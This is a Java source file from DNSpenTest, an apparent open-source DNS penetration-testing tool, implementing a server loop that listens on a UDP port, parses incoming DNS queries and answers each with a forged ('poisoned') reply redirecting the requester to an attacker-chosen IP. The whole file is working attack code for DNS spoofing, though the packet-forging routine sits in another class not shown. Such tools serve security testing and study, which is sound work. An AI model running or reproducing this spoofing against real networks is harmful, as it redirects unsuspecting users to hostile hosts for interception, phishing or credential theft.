/** 
 *  This code is part of DNSpenTest (a project of sourceforge.net) and has 
 *  been developed by the Project's members.
 *    
 *  This program is free software; you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation; either version 2 of the License, or
 *  (at your option) any later version.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with this program; if not, write to the Free Software
 *  Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA  
 */

import java.io.IOException;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.SocketException;

public class ServerKernelProgram {
 private DatagramSocket serverS;
 private DatagramPacket packet;
 private AnalizeDNS rq;
  
 private DatagramPacket create_poisoned_pck () {
  rq.poisoner();
  DatagramPacket packet_out = new DatagramPacket(new byte[rq.getpayloadLenght() + 62], rq.getpayloadLenght() + 62);
  packet_out.setAddress(packet.getAddress());
  packet_out.setPort(packet.getPort());
  packet_out.setData(rq.getpayload_FORGED());
  return packet_out;
 }
 
 private void send_packet (DatagramPacket pck){
  try {
   serverS.send(pck);
   System.out.print("POISONED...\n");
  } catch (IOException e) {
   e.printStackTrace();
  }
  serverS.close();
 }
 
 public void receiveANDanswer (String port_string, String ip_server, String ip_h2h) {
  serverS = null;
  packet = new DatagramPacket(new byte[512], 512);
  int port;
  port = Integer.parseInt(port_string.trim());
  System.out.println("wait for request on " + port + "/UDP port...\n\n");
  while (true) {
   try {
    serverS = new DatagramSocket(port);
   } catch (SocketException e) {
    e.printStackTrace();
   }
   try {
    serverS.receive(packet);
   } catch (IOException e) {
    e.printStackTrace();
   }
   
   rq = new AnalizeDNS(packet, ip_h2h);
   rq.parser();
   System.out.print("Received data from: "
     + packet.getAddress().toString().substring(1) + ":" + packet.getPort()
     + " with length: " + packet.getLength() + " asking for: ");
   System.out.print(rq.getURL());
   System.out.print("\n");
   send_packet (create_poisoned_pck());
  }
 }
 
}
